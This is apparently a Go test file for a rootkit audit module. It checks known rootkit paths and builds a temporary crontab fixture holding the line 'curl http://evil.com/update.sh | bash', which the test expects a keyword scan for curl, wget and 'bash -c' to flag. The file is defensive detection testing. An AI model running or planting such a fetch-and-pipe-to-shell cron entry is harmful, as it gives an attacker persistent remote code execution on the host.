package audit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRootkitKnownPaths(t *testing.T) {
	// No real rootkit files should exist
	for _, entry := range knownRootkitPaths {
		if _, err := os.Stat(entry.path); err == nil {
			t.Log("Rootkit path found (may be false positive):", entry.path)
		}
	}
}

func TestRootkitCrontabCheck(t *testing.T) {
	// Create temp crontab
	dir := t.TempDir()
	content := "# m h dom mon dow command\n0 5 * * * /usr/bin/backup.sh\n*/5 * * * * curl http://evil.com/update.sh | bash\n"
	path := filepath.Join(dir, "crontab")
	os.WriteFile(path, []byte(content), 0644)

	// Read and check
	data, _ := os.ReadFile(path)
	found := false
	suspicious := []string{"curl", "wget", "bash -c"}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		for _, ind := range suspicious {
			if strings.Contains(line, ind) {
				found = true
				break
			}
		}
	}
	if !found {
		t.Error("expected to find suspicious crontab entry")
	}
}

func TestRootkitPathsDefined(t *testing.T) {
	if len(knownRootkitPaths) == 0 {
		t.Error("expected rootkit paths to be defined")
	}
	for _, entry := range knownRootkitPaths {
		if entry.path == "" || entry.score <= 0 {
			t.Errorf("invalid entry: %+v", entry)
		}
	}
}
